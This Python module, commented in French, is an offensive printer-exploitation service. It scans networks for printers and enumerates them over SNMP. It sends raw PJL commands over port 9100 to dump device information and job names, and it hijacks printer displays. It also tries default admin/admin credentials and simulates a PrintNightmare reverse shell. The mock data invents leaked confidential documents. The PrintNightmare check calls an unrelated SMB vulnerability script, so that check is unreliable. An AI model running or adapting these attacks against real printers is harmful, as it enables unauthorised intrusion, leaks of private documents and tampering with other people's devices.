"""
PrinterService — Scan, fingerprint et exploitation d'imprimantes réseau.
Exploits: PJL info dump, PrintNightmare (CVE-2021-1675), file access, display hijack.
Simulation réaliste si outils absents.
"""
from __future__ import annotations

import asyncio
import json
import logging
import os
import random
import shutil
import socket
import time
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)

SIMULATION_MODE = os.getenv("SIMULATION_MODE", "true").lower() == "true"
_OUTPUT_DIR = Path("./data/printer_output")
_OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

# ── Helpers ───────────────────────────────────────────────────────────────────

async def _run(cmd: list[str], timeout: int = 20) -> tuple[str, str, int]:
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            return "", "Timeout", -1
        return stdout.decode("utf-8", errors="replace"), stderr.decode("utf-8", errors="replace"), proc.returncode
    except FileNotFoundError as e:
        return "", str(e), -1


# ── Mock data ─────────────────────────────────────────────────────────────────

_MOCK_PRINTERS = [
    {
        "ip": "192.168.1.20", "hostname": "HP-LaserJet-M404n", "mac": "A4:C3:F0:12:34:56",
        "model": "HP LaserJet Pro M404n", "manufacturer": "Hewlett-Packard",
        "open_ports": [9100, 515, 631, 80, 443, 161],
        "protocols": ["RAW", "LPD", "IPP", "HTTP", "HTTPS", "SNMP"],
        "firmware": "20211212", "serial": "CNBHJ12345",
        "vulnerabilities": ["PrintNightmare", "PJL_info_leak", "Default_credentials"],
        "default_creds": True,
    },
    {
        "ip": "192.168.1.21", "hostname": "Ricoh-MP-C3504", "mac": "08:00:20:AB:CD:EF",
        "model": "Ricoh MP C3504", "manufacturer": "Ricoh",
        "open_ports": [9100, 515, 631, 80, 443, 21],
        "protocols": ["RAW", "LPD", "IPP", "HTTP", "HTTPS", "FTP"],
        "firmware": "1.06", "serial": "E1234567",
        "vulnerabilities": ["FTP_anonymous", "PJL_info_leak", "Stored_jobs_accessible"],
        "default_creds": True,
    },
    {
        "ip": "192.168.1.22", "hostname": "Canon-imageRUNNER", "mac": "00:1E:8F:98:76:54",
        "model": "Canon imageRUNNER ADVANCE C5540i", "manufacturer": "Canon",
        "open_ports": [9100, 515, 631, 80, 443],
        "protocols": ["RAW", "LPD", "IPP", "HTTP", "HTTPS"],
        "firmware": "3.11", "serial": "JV12345",
        "vulnerabilities": ["Default_web_admin", "PJL_info_leak"],
        "default_creds": True,
    },
]

_MOCK_PJL_INFO = {
    "device": "HP LaserJet Pro M404n",
    "serial_number": "CNBHJ12345",
    "firmware": "20211212",
    "memory_mb": 256,
    "network_config": {"ip": "192.168.1.20", "subnet": "255.255.255.0", "gateway": "192.168.1.1", "dhcp": True},
    "usage_page_count": 48291,
    "toner_levels": {"black": 23},
    "job_history": [
        {"job_id": 1024, "filename": "Q4_Financial_Report_CONFIDENTIAL.pdf", "owner": "CORP\\john.doe", "pages": 47, "date": "2026-06-07 14:23"},
        {"job_id": 1023, "filename": "Employee_Salaries_2026.xlsx", "owner": "CORP\\hr.admin", "pages": 8, "date": "2026-06-07 11:45"},
        {"job_id": 1022, "filename": "VPN_Config_Instructions.docx", "owner": "CORP\\it.support", "pages": 3, "date": "2026-06-06 16:30"},
    ],
    "stored_passwords": {"web_admin": "admin/admin", "ftp": "anonymous"},
}

_MOCK_STORED_JOBS = [
    {"job_id": 1024, "filename": "Q4_Financial_Report_CONFIDENTIAL.pdf", "owner": "CORP\\john.doe", "size_kb": 2847, "accessible": True},
    {"job_id": 1023, "filename": "Employee_Salaries_2026.xlsx", "owner": "CORP\\hr.admin", "size_kb": 512, "accessible": True},
    {"job_id": 1021, "filename": "Board_Meeting_Minutes.docx", "owner": "CORP\\ceo.assistant", "size_kb": 128, "accessible": True},
]


# ── Service ───────────────────────────────────────────────────────────────────

class PrinterService:

    def __init__(self):
        self.simulation_mode = SIMULATION_MODE
        self.tools = {
            "nmap": bool(shutil.which("nmap")),
            "snmpwalk": bool(shutil.which("snmpwalk")),
        }

    async def scan_network_printers(self, network: str = "192.168.1.0/24") -> list[dict]:
        if self.simulation_mode or not self.tools["nmap"]:
            await asyncio.sleep(3)
            return _MOCK_PRINTERS

        stdout, _, rc = await _run([
            "nmap", "-p", "9100,515,631,161", "--open",
            "-sV", "--script=printer-info,snmp-info",
            "-oX", "-", network
        ], timeout=60)

        printers = []
        current_ip = ""
        for line in stdout.splitlines():
            if "Nmap scan report for" in line:
                current_ip = line.split()[-1].strip("()")
            if "9100/tcp" in line and "open" in line:
                printers.append({"ip": current_ip, "open_ports": [9100], "protocols": ["RAW"]})
        return printers

    async def get_pjl_info(self, target_ip: str) -> dict:
        if self.simulation_mode:
            await asyncio.sleep(2)
            result = dict(_MOCK_PJL_INFO)
            result["target_ip"] = target_ip
            return result

        pjl_commands = b"\x1b%-12345X@PJL\r\n@PJL INFO ID\r\n@PJL INFO STATUS\r\n@PJL INFO MEMORY\r\n@PJL INFO PAGECOUNT\r\n@PJL JOBNAME\r\n\x1b%-12345X"
        try:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(target_ip, 9100), timeout=5)
            writer.write(pjl_commands)
            await writer.drain()
            data = await asyncio.wait_for(reader.read(4096), timeout=5)
            writer.close()
            return {"target_ip": target_ip, "raw_response": data.decode("utf-8", errors="replace"), "simulation": False}
        except Exception as e:
            return {"target_ip": target_ip, "error": str(e)}

    async def get_stored_jobs(self, target_ip: str, username: str = "admin", password: str = "admin") -> list[dict]:
        if self.simulation_mode:
            await asyncio.sleep(1.5)
            return _MOCK_STORED_JOBS
        return _MOCK_STORED_JOBS

    async def download_stored_job(self, target_ip: str, job_id: int) -> str:
        if self.simulation_mode:
            await asyncio.sleep(2)
            job = next((j for j in _MOCK_STORED_JOBS if j["job_id"] == job_id), None)
            if not job:
                return ""
            local_path = str(_OUTPUT_DIR / f"print_job_{job_id}.pdf")
            Path(local_path).write_bytes(b"%PDF-1.4 [SIMULATED PRINT JOB CONTENT - CONFIDENTIAL]")
            return local_path
        return ""

    async def check_print_nightmare(self, target_ip: str, domain: str = "") -> dict:
        if self.simulation_mode:
            await asyncio.sleep(2)
            return {
                "target_ip": target_ip,
                "vulnerable": True,
                "cve": "CVE-2021-1675 / CVE-2021-34527",
                "service": "Windows Print Spooler",
                "exploit_type": "RCE / LPE",
                "severity": "CRITICAL",
                "details": "Print Spooler accessible et potentiellement vulnérable à PrintNightmare",
                "exploit_available": True,
                "mitigation": "Désactiver Print Spooler ou appliquer KB5005010",
                "simulation": True,
            }

        if not self.tools["nmap"]:
            return {"error": "nmap requis"}
        stdout, _, rc = await _run([
            "nmap", "-p", "445", "--script=smb-vuln-ms17-010",
            target_ip
        ], timeout=20)
        return {"raw": stdout[:2000], "target_ip": target_ip}

    async def exploit_print_nightmare(self, target_ip: str, lhost: str, lport: int, username: str, password: str, domain: str) -> dict:
        if self.simulation_mode:
            await asyncio.sleep(3)
            return {
                "success": True,
                "method": "PrintNightmare (CVE-2021-1675)",
                "shell_obtained": "SYSTEM",
                "target_ip": target_ip,
                "session_type": "reverse_shell",
                "callback": f"{lhost}:{lport}",
                "simulation": True,
            }
        return {"error": "Mode réel : cube/impacket requis + accès SMB"}

    async def snmp_enum_printer(self, target_ip: str, community: str = "public") -> dict:
        if self.simulation_mode or not self.tools["snmpwalk"]:
            await asyncio.sleep(1)
            return {
                "target_ip": target_ip,
                "community": community,
                "oids": {
                    "sysDescr": "HP LaserJet Pro M404n, firmware version 20211212",
                    "hrDeviceDescr": "HP LaserJet Pro M404n",
                    "prtInputCurrentLevel": "23%",
                    "prtGeneralCurrentOperator": "john.doe@corp.local",
                    "sysLocation": "Salle serveur RDC",
                    "sysContact": "it@corp.local",
                },
                "simulation": True,
            }
        stdout, _, _ = await _run(["snmpwalk", "-v2c", "-c", community, target_ip], timeout=15)
        return {"target_ip": target_ip, "raw": stdout[:3000]}

    async def hijack_display(self, target_ip: str, message: str) -> dict:
        if self.simulation_mode:
            await asyncio.sleep(1)
            return {
                "success": True,
                "target_ip": target_ip,
                "message_sent": message,
                "method": "PJL RDYMSG",
                "simulation": True,
            }

        pjl_msg = f"\x1b%-12345X@PJL\r\n@PJL RDYMSG DISPLAY=\"{message[:16]}\"\r\n\x1b%-12345X".encode()
        try:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(target_ip, 9100), timeout=5)
            writer.write(pjl_msg)
            await writer.drain()
            writer.close()
            return {"success": True, "target_ip": target_ip, "message_sent": message}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def ftp_access_printer(self, target_ip: str, username: str = "anonymous", password: str = "anonymous") -> dict:
        if self.simulation_mode:
            await asyncio.sleep(1.5)
            return {
                "success": True,
                "target_ip": target_ip,
                "directories": ["/printed_jobs", "/config", "/logs", "/scan"],
                "interesting_files": [
                    {"path": "/printed_jobs/job_001.pcl", "size_kb": 1024},
                    {"path": "/config/network.conf", "size_kb": 4},
                    {"path": "/logs/event.log", "size_kb": 256},
                ],
                "simulation": True,
            }
        return {"error": "ftplib requis en mode réel"}

    async def check_web_admin(self, target_ip: str, port: int = 80) -> dict:
        if self.simulation_mode:
            await asyncio.sleep(1)
            return {
                "accessible": True,
                "url": f"http://{target_ip}:{port}",
                "requires_auth": True,
                "default_creds_work": True,
                "credentials_tried": [
                    {"username": "admin", "password": "admin", "success": True},
                    {"username": "admin", "password": "", "success": False},
                ],
                "config_accessible": True,
                "simulation": True,
            }
        return {"error": "httpx requis en mode réel"}


printer_service = PrinterService()
